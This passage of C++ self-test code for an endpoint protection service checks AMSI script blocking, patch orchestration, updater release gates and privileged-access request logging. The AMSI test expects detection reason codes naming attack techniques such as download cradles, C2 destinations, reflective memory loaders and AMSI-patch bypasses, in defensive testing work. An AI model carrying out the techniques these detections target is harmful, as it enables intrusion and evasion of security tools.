               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_ransomware_false_positive_developer_build",
               L"Phase 2 developer build false-positive resistance", SelfTestStatus::Fail,
               L"Phase 2 developer build simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
    }

    try {
      auto phase3Config = config;
      phase3Config.runtimeDatabasePath = phaseValidationRoot / L"phase3-runtime.db";
      phase3Config.quarantineRootPath = phaseValidationRoot / L"phase3-quarantine";
      phase3Config.evidenceRootPath = phaseValidationRoot / L"phase3-evidence";
      phase3Config.scanExcludedPaths.clear();

      std::error_code phase3PathError;
      std::filesystem::create_directories(phase3Config.runtimeDatabasePath.parent_path(), phase3PathError);
      std::filesystem::create_directories(phase3Config.quarantineRootPath, phase3PathError);
      std::filesystem::create_directories(phase3Config.evidenceRootPath, phase3PathError);

      if (phase3PathError) {
        AddCheck(report, L"phase3_amsi_script_depth", L"Phase 3 AMSI script-depth correlation",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 3 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 3 AMSI checks.");
        AddCheck(report, L"phase3_amsi_false_positive_benign", L"Phase 3 AMSI benign-script false-positive resistance",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 3 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 3 AMSI checks.");
      } else {
        auto phase3Policy = CreateDefaultPolicySnapshot();
        phase3Policy.cloudLookupEnabled = false;
        phase3Policy.quarantineOnMalicious = false;

        const AmsiContentRequest maliciousRequest{
            .source = AmsiContentSource::Stream,
            .deviceId = L"self-test-device",
            .appName = L"PowerShell",
            .contentName = L"memory://powershell/staged-loader.ps1",
            .sessionId = 3001,
            .quiet = false,
            .content = std::vector<unsigned char>(
                kPhase3AmsiMaliciousSample,
                kPhase3AmsiMaliciousSample + std::strlen(kPhase3AmsiMaliciousSample))};
        const auto maliciousAmsi = InspectAmsiContent(maliciousRequest, phase3Policy, phase3Config);
        const auto maliciousReasoningMatched =
            (FindingHasReasonCode(maliciousAmsi.finding, L"DOWNLOAD_CRADLE") ||
             FindingHasReasonCode(maliciousAmsi.finding, L"SUSPICIOUS_C2_DESTINATION")) &&
            (FindingHasReasonCode(maliciousAmsi.finding, L"REFLECTIVE_MEMORY_LOADER") ||
             FindingHasReasonCode(maliciousAmsi.finding, L"AMSI_PATCH_BYPASS") ||
             FindingHasReasonCode(maliciousAmsi.finding, L"LOLBIN_PROXY_CHAIN"));

        if (maliciousAmsi.blocked && maliciousReasoningMatched) {
          AddCheck(report, L"phase3_amsi_script_depth", L"Phase 3 AMSI script-depth correlation",
                   SelfTestStatus::Pass,
                   L"AMSI blocked staged script content with layered delivery and memory-loader indicators (reason " +
                       FirstReasonCode(maliciousAmsi.finding) + L").");
        } else {
          AddCheck(report, L"phase3_amsi_script_depth", L"Phase 3 AMSI script-depth correlation",
                   SelfTestStatus::Fail,
                   L"AMSI did not block or fully explain the staged script chain. Disposition was " +
                       VerdictDispositionToString(maliciousAmsi.finding.verdict.disposition) + L" with reason " +
                       FirstReasonCode(maliciousAmsi.finding) + L".",
                   L"Strengthen AMSI reasoning so download cradles, suspicious destinations, and memory-loader or LOLBin signals combine into a high-confidence block.");
        }

        const AmsiContentRequest benignRequest{
            .source = AmsiContentSource::Stream,
            .deviceId = L"self-test-device",
            .appName = L"PowerShell",
            .contentName = L"memory://powershell/benign-admin-task.ps1",
            .sessionId = 3002,
            .quiet = false,
            .content = std::vector<unsigned char>(
                kPhase3AmsiBenignSample,
                kPhase3AmsiBenignSample + std::strlen(kPhase3AmsiBenignSample))};
        const auto benignAmsi = InspectAmsiContent(benignRequest, phase3Policy, phase3Config);

        if (!benignAmsi.blocked && benignAmsi.finding.verdict.disposition == VerdictDisposition::Allow) {
          AddCheck(report, L"phase3_amsi_false_positive_benign", L"Phase 3 AMSI benign-script false-positive resistance",
                   SelfTestStatus::Pass,
                   L"AMSI allowed benign administrative script content without escalating to a block.");
        } else {
          AddCheck(report, L"phase3_amsi_false_positive_benign", L"Phase 3 AMSI benign-script false-positive resistance",
                   SelfTestStatus::Fail,
                   L"AMSI treated benign administrative script content too aggressively with disposition " +
                       VerdictDispositionToString(benignAmsi.finding.verdict.disposition) + L" (reason " +
                       FirstReasonCode(benignAmsi.finding) + L").",
                   L"Retune AMSI scoring so simple administrative discovery and reporting scripts remain allow-by-default.");
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase3_amsi_script_depth", L"Phase 3 AMSI script-depth correlation", SelfTestStatus::Fail,
               L"Phase 3 AMSI staged-script simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase3_amsi_false_positive_benign", L"Phase 3 AMSI benign-script false-positive resistance",
               SelfTestStatus::Fail, L"Phase 3 AMSI benign-script simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
    }

    try {
      auto phase4Config = config;
      phase4Config.runtimeDatabasePath = phaseValidationRoot / L"phase4-runtime.db";
      phase4Config.quarantineRootPath = phaseValidationRoot / L"phase4-quarantine";
      phase4Config.evidenceRootPath = phaseValidationRoot / L"phase4-evidence";
      phase4Config.updateRootPath = phaseValidationRoot / L"phase4-updates";
      phase4Config.scanExcludedPaths.clear();

      std::error_code phase4PathError;
      std::filesystem::create_directories(phase4Config.runtimeDatabasePath.parent_path(), phase4PathError);
      std::filesystem::create_directories(phase4Config.quarantineRootPath, phase4PathError);
      std::filesystem::create_directories(phase4Config.evidenceRootPath, phase4PathError);
      std::filesystem::create_directories(phase4Config.updateRootPath, phase4PathError);

      if (phase4PathError) {
        AddCheck(report, L"phase4_patch_policy_roundtrip", L"Phase 4 patch-policy roundtrip", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 4 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, evidence, and update roots are writable before running Phase 4 patch-orchestration checks.");
        AddCheck(report, L"phase4_windows_patch_state_refresh", L"Phase 4 Windows patch-state refresh",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 4 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, evidence, and update roots are writable before running Phase 4 patch-orchestration checks.");
        AddCheck(report, L"phase4_software_patch_recipe_coverage", L"Phase 4 software patch recipe coverage",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 4 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, evidence, and update roots are writable before running Phase 4 patch-orchestration checks.");
        AddCheck(report, L"phase4_patch_visibility_snapshot", L"Phase 4 patch visibility snapshot", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 4 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, evidence, and update roots are writable before running Phase 4 patch-orchestration checks.");
        AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 4 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, evidence, and update roots are writable before running Phase 4 release-gate checks.");
      } else {
        PatchOrchestrator patchOrchestrator(phase4Config);
        auto policy = patchOrchestrator.LoadPolicy();
        policy.autoInstallWindowsSecurity = true;
        policy.autoInstallWindowsQuality = true;
        policy.deferFeatureUpdates = true;
        policy.includeDriverUpdates = false;
        policy.includeOptionalUpdates = false;
        policy.autoUpdateHighRiskAppsOnly = true;
        policy.autoUpdateAllSupportedApps = false;
        policy.allowNativeUpdaters = true;
        policy.allowWinget = true;
        policy.allowRecipes = true;
        policy.maintenanceWindowStart = L"01:30";
        policy.maintenanceWindowEnd = L"04:30";
        policy.rebootGracePeriodMinutes = 180;
        policy.featureUpdateDeferralDays = 45;
        patchOrchestrator.SavePolicy(policy);

        const auto persistedPolicy = patchOrchestrator.LoadPolicy();
        if (persistedPolicy.maintenanceWindowStart == L"01:30" && persistedPolicy.maintenanceWindowEnd == L"04:30" &&
            persistedPolicy.rebootGracePeriodMinutes == 180 && persistedPolicy.featureUpdateDeferralDays == 45 &&
            persistedPolicy.allowWinget && persistedPolicy.allowRecipes && persistedPolicy.autoInstallWindowsSecurity) {
          AddCheck(report, L"phase4_patch_policy_roundtrip", L"Phase 4 patch-policy roundtrip", SelfTestStatus::Pass,
                   L"Patch policy persisted maintenance windows, reboot grace, provider toggles, and feature deferral settings.");
        } else {
          AddCheck(report, L"phase4_patch_policy_roundtrip", L"Phase 4 patch-policy roundtrip", SelfTestStatus::Fail,
                   L"Patch policy values did not round-trip through the runtime database cleanly.",
                   L"Validate the patch_policy table mappings so persisted maintenance, reboot, and provider controls remain stable.");
        }

        const auto refreshSummary = patchOrchestrator.RefreshPatchState();
        const auto refreshedSnapshot = patchOrchestrator.LoadSnapshot(20, 50, 20, 50);
        if (!refreshedSnapshot.policy.policyId.empty() && refreshedSnapshot.recipes.size() >= 10 &&
            refreshedSnapshot.rebootState.gracePeriodMinutes == persistedPolicy.rebootGracePeriodMinutes &&
            refreshSummary.recipeCount >= 10) {
          AddCheck(report, L"phase4_windows_patch_state_refresh", L"Phase 4 Windows patch-state refresh",
                   SelfTestStatus::Pass,
                   L"Patch orchestrator refreshed policy, reboot coordination, recipe catalog, and local patch inventory without execution errors.");
        } else {
          AddCheck(report, L"phase4_windows_patch_state_refresh", L"Phase 4 Windows patch-state refresh",
                   SelfTestStatus::Fail,
                   L"Patch orchestrator refresh did not populate the expected local policy, reboot, or recipe state surfaces.",
                   L"Validate refresh flow so Windows update discovery, reboot tracking, and inventory persistence always publish a usable local snapshot.");
        }

        RuntimeDatabase phase4Database(phase4Config.runtimeDatabasePath);
        const auto recipes = phase4Database.ListPackageRecipes(200);
        const std::vector<std::wstring> requiredRecipeIds = {
            L"google-chrome", L"microsoft-edge", L"mozilla-firefox", L"adobe-reader", L"7zip",
            L"java-runtime", L"vlc-media-player", L"notepad-plus-plus", L"microsoft-teams",
            L"zoom", L"vcpp-redistributable"};
        auto missingRecipes = std::vector<std::wstring>{};
        for (const auto& requiredRecipeId : requiredRecipeIds) {
          const auto match = std::find_if(recipes.begin(), recipes.end(), [&](const auto& recipe) {
            return recipe.recipeId == requiredRecipeId && recipe.enabled;
          });
          if (match == recipes.end()) {
            missingRecipes.push_back(requiredRecipeId);
          }
        }

        if (missingRecipes.empty()) {
          AddCheck(report, L"phase4_software_patch_recipe_coverage", L"Phase 4 software patch recipe coverage",
                   SelfTestStatus::Pass,
                   L"Phase 4 recipe catalog covers the initial high-risk household software baseline including browsers, reader, archive, runtime, conferencing, and media tooling.");
        } else {
          AddCheck(report, L"phase4_software_patch_recipe_coverage", L"Phase 4 software patch recipe coverage",
                   SelfTestStatus::Fail,
                   L"Patch recipe catalog is missing required baseline coverage entries: " +
                       std::accumulate(std::next(missingRecipes.begin()), missingRecipes.end(), missingRecipes.front(),
                                       [](std::wstring left, const std::wstring& right) { return left + L", " + right; }) +
                       L".",
                   L"Add or re-enable recipe coverage for the missing high-risk software families before promoting Phase 4.");
        }

        phase4Database.ReplaceWindowsUpdateRecords({WindowsUpdateRecord{
            .updateId = L"selftest-kb5039999",
            .revision = L"1",
            .title = L"2026-04 Cumulative Update for Windows 11",
            .kbArticles = L"KB5039999",
            .categories = L"Security Updates;Update Rollups",
            .classification = L"security",
            .severity = L"Critical",
            .updateType = L"software",
            .deploymentAction = L"installation",
            .discoveredAt = CurrentUtcTimestamp(),
            .lastAttemptAt = CurrentUtcTimestamp(),
            .status = L"failed",
            .failureCode = L"0x80240022",
            .detailJson = L"{\"canRequestUserInput\":false}",
            .installed = false,
            .hidden = false,
            .downloaded = true,
            .mandatory = true,
            .browseOnly = false,
            .rebootRequired = true,
            .driver = false,
            .featureUpdate = false,
            .optional = false}});
        phase4Database.ReplaceSoftwarePatchRecords({
            SoftwarePatchRecord{
                .softwareId = L"chrome-test",
                .displayName = L"Google Chrome",
                .displayVersion = L"123.0",
                .availableVersion = L"124.0",
                .publisher = L"Google",
                .installLocation = L"C:\\Program Files\\Google\\Chrome\\Application",
                .provider = L"native-updater",
                .providerId = L"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
                .supportedSource = L"native-updater",
                .updateState = L"available",
                .updateSummary = L"Update ready through native updater.",
                .lastCheckedAt = CurrentUtcTimestamp(),
                .supported = true,
                .highRisk = true},
            SoftwarePatchRecord{
                .softwareId = L"vpn-test",
                .displayName = L"Contoso VPN",
                .displayVersion = L"5.1",
                .publisher = L"Contoso",
                .provider = L"manual",
                .providerId = L"",
                .supportedSource = L"manual",
                .updateState = L"manual",
                .updateSummary = L"Vendor requires manual interaction.",
                .lastCheckedAt = CurrentUtcTimestamp(),
                .manualOnly = true,
                .userInteractionRequired = true},
            SoftwarePatchRecord{
                .softwareId = L"legacy-test",
                .displayName = L"Legacy Archive Tool",
                .displayVersion = L"2.0",
                .publisher = L"LegacySoft",
                .provider = L"manual",
                .providerId = L"",
                .supportedSource = L"unsupported",
                .updateState = L"unsupported",
                .updateSummary = L"Unsupported package source.",
                .lastCheckedAt = CurrentUtcTimestamp(),
                .supported = false}});
        phase4Database.UpsertPatchHistoryRecord(PatchHistoryRecord{
            .recordId = L"phase4-history-1",
            .targetType = L"windows-update",
            .targetId = L"selftest-kb5039999",
            .title = L"2026-04 Cumulative Update for Windows 11",
            .provider = L"windows-update-agent",
            .action = L"install",
            .status = L"failed",
            .startedAt = CurrentUtcTimestamp(),
            .completedAt = CurrentUtcTimestamp(),
            .errorCode = L"0x80240022",
            .detailJson = L"{\"stage\":\"install\"}",
            .rebootRequired = true});
        phase4Database.SaveRebootCoordinator(RebootCoordinatorRecord{
            .rebootRequired = true,
            .pendingWindowsUpdate = true,
            .pendingFileRename = false,
            .pendingComputerRename = false,
            .pendingComponentServicing = true,
            .rebootReasons = L"windows_update;component_servicing",
            .detectedAt = CurrentUtcTimestamp(),
            .deferredUntil = L"",
            .gracePeriodMinutes = 180,
            .status = L"pending"});

        const auto verificationSnapshot = patchOrchestrator.LoadSnapshot(10, 10, 10, 20);
        const auto hasFailedWindowsUpdate = std::any_of(
            verificationSnapshot.windowsUpdates.begin(), verificationSnapshot.windowsUpdates.end(),
            [](const auto& update) { return update.updateId == L"selftest-kb5039999" && update.status == L"failed"; });
        const auto hasManualSoftware = std::any_of(
            verificationSnapshot.software.begin(), verificationSnapshot.software.end(),
            [](const auto& software) { return software.softwareId == L"vpn-test" && software.manualOnly && software.updateState == L"manual"; });
        const auto hasUnsupportedSoftware = std::any_of(
            verificationSnapshot.software.begin(), verificationSnapshot.software.end(),
            [](const auto& software) { return software.softwareId == L"legacy-test" && !software.supported && software.updateState == L"unsupported"; });
        const auto hasFailedHistory = std::any_of(
            verificationSnapshot.history.begin(), verificationSnapshot.history.end(),
            [](const auto& item) { return item.recordId == L"phase4-history-1" && item.status == L"failed"; });

        if (verificationSnapshot.rebootState.rebootRequired && verificationSnapshot.rebootState.pendingWindowsUpdate &&
            hasFailedWindowsUpdate && hasManualSoftware && hasUnsupportedSoftware && hasFailedHistory) {
          AddCheck(report, L"phase4_patch_visibility_snapshot", L"Phase 4 patch visibility snapshot",
                   SelfTestStatus::Pass,
                   L"Patch snapshot preserved failed updates, reboot-required state, manual-only software, unsupported software, and patch history for user-facing reporting.");
        } else {
          AddCheck(report, L"phase4_patch_visibility_snapshot", L"Phase 4 patch visibility snapshot",
                   SelfTestStatus::Fail,
                   L"Patch snapshot did not preserve enough state to explain missing, failed, reboot-pending, manual-only, and unsupported patch conditions.",
                   L"Validate patch inventory, reboot coordinator, and history views so dashboard and client surfaces can explain patch posture clearly.");
        }

        const auto releaseGateRoot = phaseValidationRoot / L"phase4-release-gates";
        const auto releaseGatePackageRoot = releaseGateRoot / L"package";
        const auto releaseGateInstallRoot = releaseGateRoot / L"install";
        std::error_code releaseGatePathError;
        std::filesystem::create_directories(releaseGatePackageRoot / L"payload", releaseGatePathError);
        std::filesystem::create_directories(releaseGateInstallRoot / L"bin", releaseGatePathError);

        if (releaseGatePathError) {
          AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                   SelfTestStatus::Fail,
                   L"Self-test could not prepare isolated updater promotion-gate fixture paths under " +
                       releaseGateRoot.wstring() + L".",
                   L"Ensure Phase 4 release-gate fixture paths are writable before rerunning self-test.");
        } else {
          const auto payloadPath = releaseGatePackageRoot / L"payload" / L"phase4-release-gate.bin";
          if (!WriteSelfTestSample(payloadPath,
                                   "Fenrir updater release-gate validation payload.\n")) {
            AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                     SelfTestStatus::Fail,
                     L"Self-test could not stage updater release-gate payload artifacts for Phase 4 validation.",
                     L"Validate release-gate fixture write permissions before rerunning self-test.");
          } else {
            const auto payloadSha256 = ComputeFileSha256(payloadPath);
            if (payloadSha256.size() != 64) {
              AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                       SelfTestStatus::Fail,
                       L"Self-test could not compute a valid SHA-256 hash for Phase 4 updater gate fixtures.",
                       L"Validate cryptography provider availability before rerunning self-test.");
            } else {
              auto releaseGateConfig = phase4Config;
              releaseGateConfig.runtimeDatabasePath = releaseGateRoot / L"release-gate-runtime.db";
              releaseGateConfig.updateRootPath = releaseGateRoot / L"updates";
              releaseGateConfig.platformVersion = L"platform-0.1.0";
              releaseGateConfig.enforceReleasePromotionGates = true;

              std::filesystem::create_directories(releaseGateConfig.runtimeDatabasePath.parent_path(),
                                                  releaseGatePathError);
              std::filesystem::create_directories(releaseGateConfig.updateRootPath, releaseGatePathError);
              if (releaseGatePathError) {
                AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                         SelfTestStatus::Fail,
                         L"Self-test could not prepare isolated updater runtime roots for release-gate validation.",
                         L"Ensure update/runtime fixture roots are writable before rerunning self-test.");
              } else {
                struct ReleaseGateScenario {
                  std::wstring id;
                  std::wstring expectedError;
                  int selfTestPassPercent;
                  int patchTestPassPercent;
                  int ransomwareTestPassPercent;
                  int upgradeRollbackPassPercent;
                  int crashBudgetPpm;
                  int falsePositiveBudgetPpm;
                  int rollbackBudgetPpm;
                  bool hotfixRequired;
                  std::wstring promotionGate;
                  std::wstring approvalTicket;
                };

                const std::vector<ReleaseGateScenario> scenarios = {
                    ReleaseGateScenario{
                        .id = L"pass-rate-threshold",
                        .expectedError = L"test pass rates do not meet promotion thresholds",
                        .selfTestPassPercent = 98,
                        .patchTestPassPercent = 99,
                        .ransomwareTestPassPercent = 99,
                        .upgradeRollbackPassPercent = 99,
                        .crashBudgetPpm = 25,
                        .falsePositiveBudgetPpm = 10,
                        .rollbackBudgetPpm = 50,
                        .hotfixRequired = false,
                        .promotionGate = L"approved",
                        .approvalTicket = L"CHG-PHASE4-SELFTEST"},
                    ReleaseGateScenario{
                        .id = L"risk-budget-threshold",
                        .expectedError = L"risk budgets exceed promotion thresholds",
                        .selfTestPassPercent = 99,
                        .patchTestPassPercent = 99,
                        .ransomwareTestPassPercent = 99,
                        .upgradeRollbackPassPercent = 99,
                        .crashBudgetPpm = 45,
                        .falsePositiveBudgetPpm = 10,
                        .rollbackBudgetPpm = 50,
                        .hotfixRequired = false,
                        .promotionGate = L"approved",
                        .approvalTicket = L"CHG-PHASE4-SELFTEST"},
                    ReleaseGateScenario{
                        .id = L"hotfix-required",
                        .expectedError = L"hotfix-only handling",
                        .selfTestPassPercent = 99,
                        .patchTestPassPercent = 99,
                        .ransomwareTestPassPercent = 99,
                        .upgradeRollbackPassPercent = 99,
                        .crashBudgetPpm = 25,
                        .falsePositiveBudgetPpm = 10,
                        .rollbackBudgetPpm = 50,
                        .hotfixRequired = true,
                        .promotionGate = L"approved",
                        .approvalTicket = L"CHG-PHASE4-SELFTEST"},
                    ReleaseGateScenario{
                        .id = L"missing-approval-ticket",
                        .expectedError = L"missing an approval ticket",
                        .selfTestPassPercent = 99,
                        .patchTestPassPercent = 99,
                        .ransomwareTestPassPercent = 99,
                        .upgradeRollbackPassPercent = 99,
                        .crashBudgetPpm = 25,
                        .falsePositiveBudgetPpm = 10,
                        .rollbackBudgetPpm = 50,
                        .hotfixRequired = false,
                        .promotionGate = L"approved",
                        .approvalTicket = L""},
                };

                const auto BuildManifest =
                    [&payloadSha256](const ReleaseGateScenario& scenario) {
                      std::wstring manifest;
                      manifest += L"package_id=phase4-release-gate-" + scenario.id + L"\n";
                      manifest += L"package_type=platform\n";
                      manifest += L"target_version=platform-9.9.9\n";
                      manifest += L"channel=stable\n";
                      manifest += L"trust_domain=platform\n";
                      manifest += L"promotion_track=stable\n";
                      manifest += L"promotion_gate=" + scenario.promotionGate + L"\n";
                      manifest += L"approval_ticket=" + scenario.approvalTicket + L"\n";
                      manifest += L"package_signer=Fenrir Self-Test Signer\n";
                      manifest += L"signing_key_id=fenrir-platform-prod-2026\n";
                      manifest += L"crash_budget_ppm=" + std::to_wstring(scenario.crashBudgetPpm) + L"\n";
                      manifest += L"false_positive_budget_ppm=" + std::to_wstring(scenario.falsePositiveBudgetPpm) +
                                  L"\n";
                      manifest += L"rollback_budget_ppm=" + std::to_wstring(scenario.rollbackBudgetPpm) + L"\n";
                      manifest += L"self_test_pass_percent=" + std::to_wstring(scenario.selfTestPassPercent) + L"\n";
                      manifest += L"patch_test_pass_percent=" + std::to_wstring(scenario.patchTestPassPercent) + L"\n";
                      manifest +=
                          L"ransomware_test_pass_percent=" + std::to_wstring(scenario.ransomwareTestPassPercent) + L"\n";
                      manifest += L"upgrade_rollback_pass_percent=" +
                                  std::to_wstring(scenario.upgradeRollbackPassPercent) + L"\n";
                      manifest += L"hotfix_required=" +
                                  std::wstring(scenario.hotfixRequired ? L"true" : L"false") + L"\n";
                      manifest += L"allow_downgrade=false\n";
                      manifest += L"file=payload/phase4-release-gate.bin|bin/phase4-release-gate.bin|" +
                                  payloadSha256 + L"||false\n";
                      return manifest;
                    };

                UpdaterService updaterService(releaseGateConfig, releaseGateInstallRoot);
                std::vector<std::wstring> scenarioFailures;
                for (const auto& scenario : scenarios) {
                  const auto manifestPath = releaseGatePackageRoot / (L"phase4-release-gate-" + scenario.id + L".manifest");
                  if (!WriteSelfTestUtf8File(manifestPath, BuildManifest(scenario))) {
                    scenarioFailures.push_back(scenario.id + L": could not write manifest fixture");
                    continue;
                  }

                  const auto result = updaterService.ApplyPackage(manifestPath, UpdateApplyMode::Maintenance);
                  if (result.success) {
                    scenarioFailures.push_back(scenario.id + L": manifest unexpectedly applied");
                    continue;
                  }

                  if (!ContainsCaseInsensitive(result.errorMessage, scenario.expectedError)) {
                    scenarioFailures.push_back(scenario.id + L": unexpected error -> " + result.errorMessage);
                  }
                }

                if (scenarioFailures.empty()) {
                  AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                           SelfTestStatus::Pass,
                           L"Updater promotion-gate checks blocked all staged stable-channel manifests that violated pass-rate, risk-budget, hotfix, or approval-ticket requirements.");
                } else {
                  AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                           SelfTestStatus::Fail,
                           L"Updater promotion-gate checks did not reject all malformed release manifests. Failures: " +
                               std::accumulate(std::next(scenarioFailures.begin()), scenarioFailures.end(),
                                               scenarioFailures.front(),
                                               [](std::wstring left, const std::wstring& right) {
                                                 return left + L"; " + right;
                                               }) +
                               L".",
                           L"Validate release-gate enforcement so stable-channel promotion always blocks low pass-rates, risk-budget overruns, hotfix-only manifests, and missing approval tickets.");
                }
              }
            }
          }
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase4_patch_policy_roundtrip", L"Phase 4 patch-policy roundtrip", SelfTestStatus::Fail,
               L"Phase 4 patch policy validation failed: " + Utf8ToWide(error.what()),
               L"Validate isolated patch orchestrator runtime paths and database mappings before rerunning self-test.");
      AddCheck(report, L"phase4_windows_patch_state_refresh", L"Phase 4 Windows patch-state refresh",
               SelfTestStatus::Fail, L"Phase 4 patch refresh validation failed: " + Utf8ToWide(error.what()),
               L"Validate Windows and software patch discovery flow before rerunning self-test.");
      AddCheck(report, L"phase4_software_patch_recipe_coverage", L"Phase 4 software patch recipe coverage",
               SelfTestStatus::Fail, L"Phase 4 patch recipe validation failed: " + Utf8ToWide(error.what()),
               L"Validate recipe catalog seeding and reload the patch orchestrator before rerunning self-test.");
      AddCheck(report, L"phase4_patch_visibility_snapshot", L"Phase 4 patch visibility snapshot", SelfTestStatus::Fail,
               L"Phase 4 patch visibility validation failed: " + Utf8ToWide(error.what()),
               L"Validate patch snapshot persistence and reporting surfaces before rerunning self-test.");
      AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
          SelfTestStatus::Fail, L"Phase 4 release-gate validation failed: " + Utf8ToWide(error.what()),
          L"Validate updater manifest policy gate enforcement and rerun self-test.");
    }

    try {
      auto phase5Config = config;
      phase5Config.runtimeDatabasePath = phaseValidationRoot / L"phase5-runtime.db";
      phase5Config.stateFilePath = phaseValidationRoot / L"phase5-state.ini";
      phase5Config.telemetryQueuePath = phaseValidationRoot / L"phase5-telemetry.tsv";
      phase5Config.updateRootPath = phaseValidationRoot / L"phase5-updates";
      phase5Config.journalRootPath = phaseValidationRoot / L"phase5-journal";
      phase5Config.quarantineRootPath = phaseValidationRoot / L"phase5-quarantine";
      phase5Config.evidenceRootPath = phaseValidationRoot / L"phase5-evidence";
      phase5Config.scanExcludedPaths.clear();

      std::error_code phase5PathError;
      std::filesystem::create_directories(phase5Config.runtimeDatabasePath.parent_path(), phase5PathError);
      std::filesystem::create_directories(phase5Config.journalRootPath, phase5PathError);
      std::filesystem::create_directories(phase5Config.updateRootPath, phase5PathError);
      std::filesystem::create_directories(phase5Config.quarantineRootPath, phase5PathError);
      std::filesystem::create_directories(phase5Config.evidenceRootPath, phase5PathError);

      if (phase5PathError) {
        AddCheck(report, L"phase5_pam_request_queue_visibility", L"Phase 5 PAM request queue visibility",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 5 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime and journal roots are writable before running Phase 5 PAM checks.");
        AddCheck(report, L"phase5_pam_audit_visibility", L"Phase 5 PAM audit visibility", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 5 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime and journal roots are writable before running Phase 5 PAM checks.");
        AddCheck(report, L"phase5_admin_membership_audit", L"Phase 5 local-admin membership audit",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 5 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime and journal roots are writable before running Phase 5 PAM checks.");
      } else {
        const auto phase5RuntimeRoot = phase5Config.runtimeDatabasePath.parent_path();
        const auto phase5RequestPath = phase5RuntimeRoot / L"pam-request.json";
        const auto phase5AuditPath = phase5Config.journalRootPath / L"privilege-requests.jsonl";

        const auto phase5RequestPayload =
            L"{\"requestedAt\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requester\":\"selftest-user\",\"action\":\"run_application_timed\",\"targetPath\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"arguments\":\"/c whoami\",\"reason\":\"Self-test Phase 5 timed request\"}";
        const auto phase5AuditPayload =
            L"{\"timestamp\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requestedAt\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requester\":\"selftest-user\",\"action\":\"run_application_timed\",\"target\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"reason\":\"Self-test approval\",\"decision\":\"approved\",\"detail\":\"Launched process id 4242\",\"approvalSource\":\"policy\",\"durationSeconds\":120,\"terminationOutcome\":\"pending\"}\n"
            L"{\"timestamp\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requestedAt\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requester\":\"guest-user\",\"action\":\"run_powershell\",\"target\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"reason\":\"Denied by policy\",\"decision\":\"denied\",\"detail\":\"Requester is not permitted\",\"approvalSource\":\"policy\",\"durationSeconds\":0,\"terminationOutcome\":\"n/a\"}\n";

        if (!WriteSelfTestUtf8File(phase5RequestPath, phase5RequestPayload) ||
            !WriteSelfTestUtf8File(phase5AuditPath, phase5AuditPayload)) {
          AddCheck(report, L"phase5_pam_request_queue_visibility", L"Phase 5 PAM request queue visibility",
                   SelfTestStatus::Fail,
                   L"Self-test could not stage PAM request/audit artifacts for Phase 5 validation.",
                   L"Validate runtime and journal write permissions before rerunning Phase 5 checks.");
          AddCheck(report, L"phase5_pam_audit_visibility", L"Phase 5 PAM audit visibility", SelfTestStatus::Fail,
                   L"Self-test could not stage PAM request/audit artifacts for Phase 5 validation.",
                   L"Validate runtime and journal write permissions before rerunning Phase 5 checks.");
        } else {
          const auto phase5Snapshot = LoadEndpointClientSnapshot(phase5Config, 10, 10, 10, 10);

          if (phase5Snapshot.pendingPamRequestCount >= 1 &&
              (phase5Snapshot.pamHealthState == L"healthy" || phase5Snapshot.pamHealthState == L"degraded")) {
            AddCheck(report, L"phase5_pam_request_queue_visibility", L"Phase 5 PAM request queue visibility",
                     SelfTestStatus::Pass,
